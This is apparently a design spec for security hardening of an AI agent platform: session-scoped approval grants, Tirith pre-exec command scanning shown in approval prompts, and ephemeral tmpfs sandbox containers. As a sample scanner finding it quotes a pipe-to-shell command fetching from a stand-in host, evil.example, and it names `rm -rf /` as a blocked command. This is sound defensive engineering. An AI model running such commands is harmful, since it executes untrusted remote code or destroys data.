# Hermes Security v2 — Final Gap Closure Design Spec

**Date:** 2026-05-09
**Source reference:** `~/Downloads/hermes-security-v2.md` (Hermes "Security — Full Reference" doc)
**Predecessor specs:**
- `docs/superpowers/specs/2026-05-08-hermes-security-v2-design.md` — original audit + scope
- Shipped by PRs #509 (parity), #511 (Phase 2), #514 (Phase 3)
**Goal:** Close the three honest gaps that remain between hermes-security-v2.md and OpenComputer after three Hermes-security-v2 phases shipped.

---

## 1. Audit — what's actually missing

The original spec mapped 7 layers + adjacent items. Three Hermes-security-v2 phases shipped covering hardline / smart-mode / Tirith install / website blocklist / docker hardening / MCP redaction / root-gateway / approvals.mode / skill frontmatter / approvals timeout / ssh backend.

A targeted re-audit (subagent grep+read sweep, 2026-05-09) confirmed three honest gaps:

| # | Gap (Hermes ref) | Status | Evidence |
|---|---|---|---|
| 1 | Approval flow `[o]nce \| [s]ession \| [a]lways \| [d]eny` (line 121) | **PARTIAL** — only 3 of 4 verbs | `gate.py:76` renders `[y/N/always]`; adapters at `slack/adapter.py:404`, `telegram/adapter.py:1494`, `matrix/adapter.py` map only `("once","always","deny")` |
| 2 | Tirith verdict surfaced in approval prompt (line 445) | **MISSING** | `tirith.py:format_findings_for_user` has zero callers outside `tirith.py`; `BashTool.execute` and `ExecuteCode.execute` only call `check_hardline`, never `tirith.check_command()` |
| 3 | `container_persistent: true \| false` (line 270-273) | **MISSING** | grep `container_persistent` returns ZERO hits; `sandbox/docker.py` only supports bind-mount mode |

**Confirmed deferrals (stay parked, not in scope):**

| Item | Why parked |
|---|---|
| `unauthorized_dm_behavior: pair \| ignore` per platform | Original spec marked YAGNI; verified zero hits in `extensions/`. AllowlistGate's deny-with-pairing-code path covers the typical case. |
| `OPENCOMPUTER_EXEC_ASK` env var for cron | Original spec marked equivalent via `--auto`. Verified — capability is identical, only the env-var name differs. No new code needed. |

---

## 2. Scope (in)

Three surgical tasks closing the three gaps. Each is independent — order matters only for review/test cadence.

### T1 — Session-scoped consent grants (4th approval verb)

Add a `session` tier between `once` (single grant) and `always` (permanent allowlist row). Verb maps to an in-memory `(session_id, capability_id) → ConsentGrant` cache scoped to the consent gate instance.

**Lifecycle:** populated when `resolve_pending(verb="session", …)` fires; consulted by `evaluate()` before falling through to manual prompt; cleared on `SessionFinalize` hook (gate already subscribes to plugin_sdk hooks via the audit log path).

**Backwards compatibility:** old adapters that emit `verb in ("once","always","deny")` still work — they simply don't show the new button. New adapters add the button without breaking older gate versions because `resolve_pending` already accepts arbitrary `verb` strings (it just maps them).

### T2 — Tirith pre-exec scan + findings surfaced in prompt

Two integration points:

(a) **`BashTool.execute()`** and **`ExecuteCode.execute()`** call `tirith.check_command(cmd)` AFTER the hardline check (which is already wired) and BEFORE the consent gate. If Tirith returns a `BLOCKED` or `SUSPICIOUS` verdict, the tool routes through the consent gate carrying `tirith_findings` (a tuple of dicts: severity / title / description / safer_alternatives) on the `CapabilityClaim`.

(b) **`render_prompt_message()`** appends a structured findings block when `claim.tirith_findings` is non-empty:

```
Allow Bash.execute on `curl https://evil.example/install.sh | sh`?
[y/N/session/always]

  ⚠ Tirith findings:
    [HIGH] Pipe-to-interpreter pattern detected
      curl piped directly to sh allows arbitrary remote code execution.
      Safer: curl -o /tmp/install.sh https://evil.example/install.sh
             # review the file before running
```

When Tirith verdict is `BLOCKED`, default = deny (per Hermes line 445); UI flips the default highlighted button. When verdict is `SUSPICIOUS`, default = once is OK (severity-driven, not blocked).

**Failure modes (already handled):** Tirith subprocess hang → 5s timeout → `tirith_fail_open: true` allows / `tirith_fail_open: false` blocks. Tirith binary missing → auto-install path (already shipped Phase 3) → if install fails, fall back to `tirith_fail_open` posture.

### T3 — `container_persistent` filesystem mode

Add `SandboxConfig.container_persistent: bool = True` (default = current behaviour). When `False`, `sandbox/docker.py` skips bind-mounts of `/workspace` and `/root` and instead emits two additional `--tmpfs` flags:

```python
"--tmpfs", "/workspace:rw,size=512m",   # ephemeral workspace
"--tmpfs", "/root:rw,size=256m",        # ephemeral home
```

Bind-mounts (`read_paths` / `write_paths`) for explicit user-declared paths still apply — the toggle controls only the implicit `/workspace` + `/root` persistence.

Hardline check still fires regardless of mode (defence-in-depth: even ephemeral containers shouldn't run `rm -rf /` because nothing inside Hermes/OC's threat model assumes a clean image afterwards).

---

## 3. Design

### 3.1 T1 — session-scoped consent grants

**Module:** `opencomputer/agent/consent/gate.py` (modify), no new module.

**New state:** instance-level dict on `ConsentGate`:

```python
# opencomputer/agent/consent/gate.py
class ConsentGate:
    def __init__(self, ...):
        ...
        # (session_id, capability_id) -> ConsentGrant. Cleared on SessionFinalize.
        self._session_grants: dict[tuple[str, str], ConsentGrant] = {}
```

**Evaluate path:** in `evaluate()`, before the manual prompt, check the session cache:

```python
if (session_id, claim.capability_id) in self._session_grants:
    grant = self._session_grants[(session_id, claim.capability_id)]
    if grant.tier >= claim.tier_required:
        return self._allow_via_session_grant(claim, scope, session_id, grant)
```

**Resolve path:** `resolve_pending(verb="session", …)` writes into `_session_grants` instead of calling `store.add_grant`:

```python
elif verb == "session":
    grant = ConsentGrant(
        capability_id=claim.capability_id,
        tier=claim.tier_required,
        scope=scope,
        granted_at=now,
        # No expires_at — session-bounded, not time-bounded.
    )
    self._session_grants[(session_id, claim.capability_id)] = grant
    self._record_audit(action="allow_session", ...)
    self._emit_decision(...)
```

**Cleanup hook:** subscribe to `SESSION_FINALIZE` hook. The hook implementation in `gate.py` clears all entries with matching `session_id`:

```python
def on_session_finalize(self, session_id: str) -> None:
    keys = [k for k in self._session_grants if k[0] == session_id]
    for k in keys:
        self._session_grants.pop(k, None)
```

This is registered in `ConsentGate.__init__` via the existing hook engine (gate already imports `HookEngine` for audit-log emission).

**Render prompt:** update `render_prompt_message`:

```python
return f"Allow {cap}? [y/N/session/always]"
# scoped variant:
return f"Allow {cap} on {scope}? [y/N/session/always]"
```

**Adapter button maps (3 adapters):**

- `extensions/telegram/adapter.py` — add fourth inline-keyboard button labeled "Session" with callback verb `session`.
- `extensions/slack/adapter.py` — add fourth block-action button.
- `extensions/matrix/adapter.py` — add fourth reaction emoji (🕒) mapped to `session`.

Old adapters that don't ship this update (e.g. discord) get NO regression — they simply don't render the button. Their callback verbs (`once|always|deny`) keep working.

### 3.2 T2 — Tirith pre-exec scan + findings in prompt

**Module:** `opencomputer/security/tirith.py` (already exists, just wire it).

**Add to `CapabilityClaim`:** new optional field `tirith_findings: tuple[TirithFinding, ...] = ()`. Default empty preserves backward compat.

```python
# plugin_sdk/consent.py — extend ConsentClaim
@dataclass(frozen=True, slots=True)
class TirithFinding:
    severity: str   # "low" | "medium" | "high" | "critical"
    title: str
    description: str
    safer_alternatives: tuple[str, ...] = ()

@dataclass(frozen=True, slots=True)
class CapabilityClaim:
    capability_id: str
    tier_required: ConsentTier
    scope: str | None = None
    tirith_findings: tuple[TirithFinding, ...] = ()  # NEW
```

**Tool integration:**

```python
# opencomputer/tools/bash.py — after hardline check, before consent gate
from opencomputer.security.tirith import check_command, TirithVerdict

verdict = await check_command(cmd)  # returns TirithVerdict | None
findings: tuple[TirithFinding, ...] = ()
if verdict is not None and verdict.findings:
    findings = tuple(verdict.findings)

claim = CapabilityClaim(
    capability_id="Bash.execute",
    tier_required=ConsentTier.PER_ACTION,
    scope=scope,
    tirith_findings=findings,
)
decision = await consent_gate.evaluate(claim, session_id=session_id)
```

Same pattern in `tools/execute_code.py`.

**Render prompt:** update `render_prompt_message`:

```python
def render_prompt_message(claim: CapabilityClaim, scope: str | None) -> str:
    base = f"Allow {claim.capability_id}"
    if scope:
        base += f" on {scope}"
    base += "? [y/N/session/always]"
    if claim.tirith_findings:
        base += "\n\n  ⚠ Tirith findings:"
        for f in claim.tirith_findings:
            base += f"\n    [{f.severity.upper()}] {f.title}"
            base += f"\n      {f.description}"
            for alt in f.safer_alternatives[:2]:  # cap at 2 for terminal width
                base += f"\n      Safer: {alt}"
    return base
```

**Default-deny on BLOCKED verdict:** the gate's manual-prompt code path inspects `claim.tirith_findings` for any severity == `"critical"` / Tirith verdict == BLOCKED. When found, the prompt's default highlighted button flips from "once" to "deny". This is per-adapter (telegram inline keyboard `default_button`, slack block_action `style: "danger"`, etc.).

**Verdict mapping (single source of truth):**

| Tirith verdict | Findings | Default verb |
|---|---|---|
| `SAFE` (no findings) | empty | route bypasses prompt entirely |
| `SUSPICIOUS` (medium severity findings) | populated | default = once (allow with care) |
| `BLOCKED` (high/critical severity) | populated | default = deny |

### 3.3 T3 — `container_persistent` mode

**Modify:** `opencomputer/sandbox/_common.py` (or wherever `SandboxConfig` lives) and `opencomputer/sandbox/docker.py`.

```python
# opencomputer/sandbox/_common.py
@dataclass(frozen=True, slots=True)
class SandboxConfig:
    ...
    container_persistent: bool = True  # NEW — default preserves current behaviour
```

```python
# opencomputer/sandbox/docker.py — _wrap()
def _wrap(self, cmd: list[str], cfg: SandboxConfig) -> list[str]:
    args = ["docker", "run", "--rm", *_SECURITY_ARGS, ...]
    if cfg.container_persistent:
        # Current behaviour: bind-mount workspace + home
        args.extend(["-v", f"{cfg.workspace_dir}:/workspace:rw"])
        args.extend(["-v", f"{cfg.home_dir}:/root:rw"])
    else:
        # Ephemeral mode: tmpfs for workspace + home
        args.extend(["--tmpfs", "/workspace:rw,size=512m"])
        args.extend(["--tmpfs", "/root:rw,size=256m"])
    # User-declared read_paths / write_paths still bind-mount in either mode
    for p in cfg.read_paths:
        args.extend(["-v", f"{p}:{p}:ro"])
    for p in cfg.write_paths:
        args.extend(["-v", f"{p}:{p}:rw"])
    args.extend([cfg.image, *cmd])
    return args
```

**Config schema:** Add `sandbox.container_persistent: true|false` to `config.yaml` documented in `docs/security-production.md`. Default `true` preserves backward compat for all current users.

**Doc update:** Add a paragraph to `docs/security-production.md` § Container isolation:

```
- [ ] **Decide on filesystem persistence.**
      `container_persistent: true` (default) bind-mounts the workspace and
      home dirs from `~/.opencomputer/<profile>/sandboxes/<task_id>/`.
      Output survives container teardown.
      `container_persistent: false` uses tmpfs for `/workspace` + `/root`;
      everything is lost when the container exits. Use ephemeral mode for
      cron jobs, one-shot agents, and anything that shouldn't accumulate
      state on disk.
```

### 3.4 Cross-cutting — backward compatibility

| Surface | Old behaviour | New behaviour | Compat |
|---|---|---|---|
| Consent gate verb set | `("once","always","deny")` | `("once","session","always","deny")` | Old adapters keep working — they just don't render the new button. |
| `CapabilityClaim` constructor | `(capability_id, tier_required, scope=None)` | adds `tirith_findings=()` | All-default field — old call sites work unchanged. |
| `SandboxConfig` constructor | no `container_persistent` | adds `container_persistent: bool = True` | Default = old behaviour. |
| `render_prompt_message` output | `"Allow X? [y/N/always]"` | `"Allow X? [y/N/session/always]"` | Tests need string-update; no machine consumers. |

---

## 4. Files affected

**Modify (no new modules):**

- `plugin_sdk/consent.py` — add `TirithFinding` dataclass + `CapabilityClaim.tirith_findings` field
- `opencomputer/agent/consent/gate.py` — session cache + render prompt update + cleanup hook
- `opencomputer/sandbox/_common.py` — `SandboxConfig.container_persistent` field
- `opencomputer/sandbox/docker.py` — branching on persistent vs tmpfs in `_wrap()`
- `opencomputer/tools/bash.py` — Tirith pre-exec scan, findings on claim
- `opencomputer/tools/execute_code.py` — same Tirith integration
- `extensions/telegram/adapter.py` — 4th button in inline keyboard
- `extensions/slack/adapter.py` — 4th block_action
- `extensions/matrix/adapter.py` — 4th reaction emoji
- `docs/security-production.md` — document `container_persistent` knob

**Create (tests):**

- `tests/test_consent_gate_session_tier.py` — session grant lifecycle, isolation between sessions, cleanup on SessionFinalize
- `tests/test_tirith_consent_integration.py` — wired into BashTool/ExecuteCode, findings surfaced in prompt, default-deny on BLOCKED
- `tests/test_sandbox_container_persistent.py` — both modes argv assertions
- `tests/test_consent_adapter_session_button.py` — telegram/slack/matrix render the 4th button correctly

**Total estimate:** ~600 LOC (modules + tests + doc). Single PR.

---

## 5. Risk register

| Risk | Mitigation |
|---|---|
| `_session_grants` dict leaks memory across long-running gateway sessions | SESSION_FINALIZE hook clears entries; gateway dispatch already emits SESSION_FINALIZE on session eviction. |
| Tirith integration adds latency to every Bash/ExecuteCode call | Tirith already has 5s timeout + fail-open default. Profile shows ~100ms typical scan time — acceptable for a per-call security gate. |
| `tirith_findings` field on `CapabilityClaim` breaks plugin_sdk compatibility | Field has default `()`; existing plugin code doesn't reference it. Frozen-inventory test (`test_plugin_extension_boundary.py`) won't fire. |
| `container_persistent: false` workspace lost between turns surprises users | Default = `True` preserves current behavior. Explicit opt-in required. Doc explains trade-off. |
| Adapter button-callback verb mismatch (e.g. telegram sends "session" but slack adapter expects only old verbs) | Each adapter independently extended; no cross-adapter dependency. Tests cover each adapter's verb mapping. |
| Tirith default-deny prompt changes click-through rate, breaks existing flows | Default flip applies ONLY when Tirith returns BLOCKED. SAFE/SUSPICIOUS unchanged. Logged decisions provide audit trail. |
| Race condition: session grant added during concurrent evaluate calls | `_session_grants` dict access wrapped in `asyncio.Lock` (gate already has `_pending_lock`). |

---

## 6. Honest sizing

| Task | Time | Notes |
|---|---|---|
| T1 session tier — gate + render + tests | 90 min | Adds ~60 LOC to gate.py + 1 test file (~120 LOC) |
| T1 adapter buttons — telegram + slack + matrix + tests | 60 min | ~20 LOC per adapter + 1 multi-adapter test file |
| T2 Tirith plumbing — claim field + prompt render + 2 tool integrations | 90 min | Touches plugin_sdk + gate + 2 tools + format helper |
| T2 Tirith tests — verdict mapping, default-deny on BLOCKED, fail-open path | 60 min | 1 test file (~150 LOC) — covers all 3 verdict states |
| T3 container_persistent — config field + docker.py branching | 45 min | ~25 LOC modify + 1 test file (~80 LOC) |
| T3 doc update + production checklist refresh | 15 min | Doc-only |
| Ruff + full pytest + commit + PR | 60 min | One commit per task; squash-merge |
| **Total** | **~7 hours** | One session at max effort |

---

## 7. Out-of-scope follow-ups (track as issues)

- **Discord adapter session button** — discord adapter doesn't currently render approval buttons (no consent path). When that changes, mirror the 4-button pattern.
- **Tirith finding-rich UI in dashboard** — current implementation surfaces findings as plain text. A future dashboard view could render severity-coded panels.
- **Rich session-grant inspection CLI** — `oc consent session-grants` to list active in-memory grants. YAGNI for now; manual `oc consent history` shows the audit row.
- **`unauthorized_dm_behavior` per-platform** — original parking decision still holds.
- **`OPENCOMPUTER_EXEC_ASK` env var** — equivalent capability via `--auto`; only emit if a real Hermes-migration user reports the friction.

---

## 8. Brainstorm-phase audit findings (for traceability)

Applied 9-lens audit before plan write. Findings:

| Lens | Finding | Resolution |
|---|---|---|
| 1. Assumption-check | ConsentGate had `EXPLICIT/IMPLICIT/PER_ACTION` tiers but no SESSION concept | T1 adds in-memory `_session_grants` dict — does NOT add a new tier (verbs ride on top of existing tiers). |
| 2. Architecture stress | Session grant must clear on session end | Added explicit `on_session_finalize` cleanup hook subscription. |
| 4. Requirement gap | What if user dismisses prompt without choosing? Timeout + auto-deny | Already handled via `approvals.timeout_s`. |
| 5. Composability | Tirith → consent → exec order | Verified hardline (P0) → tirith (P1) → consent (P2) → exec (P3). |
| 7. API surface drift | Adapters need null-safe handling for new verb | Backward compat documented + cross-adapter test covers. |
| 9. YAGNI | TTL on session grants? Hybrid persistence mode? Rich Markdown findings? | All cut. Hermes spec doesn't have them. |

All other lenses returned "no findings".
